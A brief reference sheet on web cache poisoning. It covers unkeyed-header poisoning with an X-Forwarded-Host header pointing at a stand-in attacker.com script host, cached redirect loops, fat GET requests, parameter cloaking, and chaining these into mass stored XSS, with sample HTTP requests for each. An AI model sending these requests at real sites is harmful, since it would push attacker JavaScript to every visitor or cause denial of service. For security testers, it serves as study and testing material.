# Web Cache Poisoning Reference

## Attack Surface Signals
- Caching headers: `X-Cache: HIT/MISS`, `Age: N`, `CF-Cache-Status: HIT`, `Fastly-Debug-Digest`, `Cache-Control: public, max-age=...`.
- Unkeyed headers / inputs reflected in response HTML or response headers: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`, `X-Rewrite-URL`, `X-Host`.

## Attack Techniques & Exploitation
1. **Unkeyed Header Poisoning (XSS / Resource Hijacking)**:
   - Identify unkeyed header reflected into page:
     ```http
     GET /index.html HTTP/1.1
     Host: target.com
     X-Forwarded-Host: attacker.com
     ```
   - If response renders `<script src="https://attacker.com/app.js">` and is cached (`X-Cache: HIT`), every subsequent visitor to `/index.html` executes attacker JavaScript.
2. **Unkeyed Port / Protocol Poisoning (DoS / Redirection)**:
   - `X-Forwarded-Proto: http` or `X-Forwarded-Port: 1337` forcing redirect loops cached globally.
3. **Fat GET Requests & Unkeyed Query Parameters**:
   - Cache keys only the URL path `GET /login`, but server processes parameters in the body:
     ```http
     GET /login HTTP/1.1
     Host: target.com
     Content-Length: 17

     callback=evil_func
     ```
4. **Parameter Cloaking & Query Parsing Anomalies**:
   - Cache treats `;` or `?` differently than backend:
     `GET /app?param=1;param=2` or `GET /app?param=1%26param=2`.

## Exploit Chains
- **Cache Poisoning → Mass Stored XSS**: Poisoning root index or shared JavaScript files to execute payload on all site visitors without direct interaction.
